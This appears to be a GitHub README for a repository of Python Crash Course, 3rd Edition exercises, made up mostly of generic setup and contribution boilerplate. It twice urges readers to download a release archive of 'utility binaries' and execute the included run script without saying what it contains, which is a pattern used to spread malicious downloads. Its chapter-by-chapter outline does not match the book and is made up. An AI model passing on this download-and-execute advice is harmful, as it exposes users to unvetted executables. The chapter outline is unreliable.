# Python Crash Course Exercises — Third Edition Study Hub & Notes

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/rolcsika67/python-crash-course-third-edition-learning/releases)

![Python Logo](https://www.python.org/static/community_logos/python-logo.png)

A focused, chapter-by-chapter collection of exercises, examples, and personal notes from Python Crash Course, 3rd Edition by Eric Matthes. The repo logs code, experiments, and concepts learned. It helps you follow along, reproduce examples, and practice core Python skills.

Badges
- Topics: book-exercises, coding-practice, eric-matthes, learning-python, learning-python-fundamentals, programming, python, python-beginners, python-crash-course, python-exercises, python-tutorial, python3
- License: MIT
- Status: Work in progress

Table of contents
- About
- What's here
- Repo layout
- How to run code
- Releases and runnable files
- Chapter highlights
- Learning tips
- Contributing
- License
- Contact

About
This repo stores code examples, small projects, and personal notes tied to each chapter. I keep working copies that show thought process, refactors, and test snippets. The goal: turn book examples into repeatable, runnable code and add small experiments that deepen understanding.

What's here
- Clean versions of book exercises.
- My variants and experiments that extend examples.
- Short notes that explain key concepts in plain language.
- Small helper scripts for common tasks.
- Minimal tests and assertions for selected exercises.
- A progress tracker per chapter in markdown.

Repo layout
- /chapter_01, /chapter_02, ... — each folder maps to a book chapter.
- /common — utility modules and helpers used across chapters.
- /notes — plain-text or markdown notes and quick reference.
- /images — screenshots and diagrams tied to explanations.
- requirements.txt — optional runtime dependencies.
- README.md — this file.

How to run code
The code targets Python 3. Use a virtual environment for isolated runs.

Unix / macOS
- python3 -m venv venv
- source venv/bin/activate
- pip install -r requirements.txt   # if you want extras
- python3 chapter_01/hello.py       # open a simple example

Windows (PowerShell)
- python -m venv venv
- .\venv\Scripts\Activate.ps1
- pip install -r requirements.txt
- python chapter_01\hello.py

Most scripts include a brief header that shows the intended Python version. For test snippets, run them directly. For small projects, check the folder README for run instructions.

Releases and runnable files
Download the release file from the Releases page and execute the included script. The release build contains packaged examples and any runnable assets. Visit and download from:
https://github.com/rolcsika67/python-crash-course-third-edition-learning/releases

Each release may include:
- A ZIP archive with chapter snapshots.
- Small runnable scripts or utility binaries.
- A run-me script or README that explains which file to execute.

After you download a release archive:
- Unpack it.
- Inspect the included README or run-me script.
- Execute the script called run.sh or run.py from a terminal. For Windows, use the provided .bat or run.py.

If you want a direct badge link, use the Releases button at the top.

Chapter highlights
Each chapter folder contains three parts: code, notes, and experiments.

Chapter 1 — Basics
- Hello world apps.
- Variables, types, and simple input/output.
- Small scripts that illustrate print formatting.

Chapter 2 — Control flow
- Conditional statements and comparisons.
- Short programs that ask questions and branch.

Chapter 3 — Functions
- Function definition and simple docstrings.
- Examples that return values and modify lists.

Chapter 4 — Lists
- List operations, slicing, and iteration.
- Exercises that create and sort lists.

Chapter 5 — Dictionaries
- Key/value basics.
- Small mapping tasks and lookups.

Chapter 6 — User input and while loops
- Input validation, counters, and loops.
- Simple interactive shells.

Chapter 7 — Files and exceptions
- Read and write text files.
- Basic error handling using try/except.

Chapter 8 — Classes and OOP
- Simple classes, methods, and attributes.
- Small toy models such as simple games or counters.

Chapter 9 — Testing and debugging
- Basic assert tests.
- Examples of debugging output and fixes.

Chapter 10+ — Projects
- Mini projects like data visualizations, simple games, and web requests.
- Each project includes a README that explains goals and run steps.

Learning tips
- Reproduce examples by typing them rather than copying. Typing helps you learn syntax and flow.
- Run small changes to see how behavior changes. Change a value, rerun, and inspect output.
- Keep tests small and focused. Use assert to check expected behavior.
- Write short notes in plain language. That cements concepts.
- Use version control to track your progress. Commit small changes.

Examples of small tasks to try
- Modify a function to accept different types.
- Replace a loop with a list comprehension.
- Add error handling to file reads.
- Turn a script into a small module with functions.

Images and visual aids
![Code on Screen](https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1200&q=80)

Use images to explain flow. Add simple diagrams in /images when a concept benefits from a picture.

Conventions used in this repo
- File names use snake_case.
- Function names use snake_case.
- Class names use PascalCase.
- Keep functions short and focused.
- Include a short comment at the top of each script explaining purpose and usage.

Testing approach
- Use asserts and small run scripts.
- Organize tests near the code they verify.
- For larger examples, add a tests/ folder with pytest-style tests where useful.

Contributing
- Open an issue for a bug or idea.
- Fork, create a branch, and submit a pull request for code changes.
- Keep changes scoped. One PR per topic works best.
- Add tests for new code where possible.
- Update the chapter README if you add an example.

Example workflow
- Fork the repo.
- Clone your fork.
- git checkout -b fix/chapter-3-typo
- Make changes and run scripts locally.
- Commit and push.
- Open a pull request with a short description.

License
This repository uses the MIT License. See LICENSE for full terms.

Contact
- GitHub: https://github.com/rolcsika67/python-crash-course-third-edition-learning
- For questions or collaboration ideas, open an issue.

Metadata and SEO
- Primary keywords: Python Crash Course, Eric Matthes, Python exercises, learning Python.
- Secondary keywords: python3, beginners, practice, book exercises.

Extra resources
- Official Python docs: https://docs.python.org/3/
- Eric Matthes book page: search for Python Crash Course 3rd Edition
- PEP8 style guide for Python code style

Quick reference commands
- run a script: python3 path/to/script.py
- create venv: python3 -m venv venv
- activate venv: source venv/bin/activate  (Unix/macOS)
- install deps: pip install -r requirements.txt

Releases (again)
Download the release file from the Releases page and execute the included script. The release build contains packaged examples, runnable assets, and a run-me script:
https://github.com/rolcsika67/python-crash-course-third-edition-learning/releases

This repo aims to help you learn by doing. Explore chapters, run examples, modify code, and push your understanding forward.